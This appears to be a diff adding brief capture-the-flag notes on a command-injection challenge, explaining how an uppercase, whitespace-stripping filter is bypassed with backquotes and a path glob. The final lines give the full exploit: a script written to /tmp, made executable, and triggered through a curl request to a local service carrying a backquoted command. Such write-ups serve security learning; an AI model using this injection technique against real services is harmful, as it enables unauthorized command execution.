@@ -1,0 +1,13 @@
+* tr/a-z/A-Z/; all in upcase
+* s/\s.*//; no space
+
+
+* we can see backquote so we can inject everything
+
+* so we can execute binaire et use match for path
+
+* sh syntax is case sensitive 
+
+- echo 'getflag > /tmp/toto' > /tmp/TOTO
+- chmod +x /tmp/TOTO
+- curl 'localhost:4646?x=`/*/TOTO`&y=toto'
